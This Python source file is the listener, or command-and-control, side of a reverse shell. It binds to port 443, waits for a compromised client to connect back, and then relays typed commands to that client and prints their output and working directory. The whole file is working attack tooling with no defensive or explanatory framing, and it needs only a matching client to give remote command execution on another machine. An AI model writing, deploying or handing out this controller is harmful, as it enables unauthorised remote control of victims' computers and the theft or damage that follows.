import socket

''' TODO: Move these to the .env '''
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 443
BUFFER_SIZE = 1024 * 128 # Max message size
SEPARATOR = '<sep>' # Separator string for sending two messages at once
s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f'Listening as {SERVER_HOST}:{SERVER_PORT}...')

''' Accept any incoming client connection. '''
client_socket, client_address = s.accept()
print(f'{client_address[0]}:{client_address[1]} Connected!')

''' Essentially pwd '''
cwd = client_socket.recv(BUFFER_SIZE).decode()
print('[+] Current working directory:', cwd)

''' We need to send using client_socket, not SERVER_SOCKET; need to encode first. '''
while True:
    command = input(f'{cwd} $> ')
    if not command.strip(): # empty command
        continue
    client_socket.send(command.encode()) # send the command to the client
    if command.lower() == 'exit':
        break
    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)

client_socket.close()
s.close()
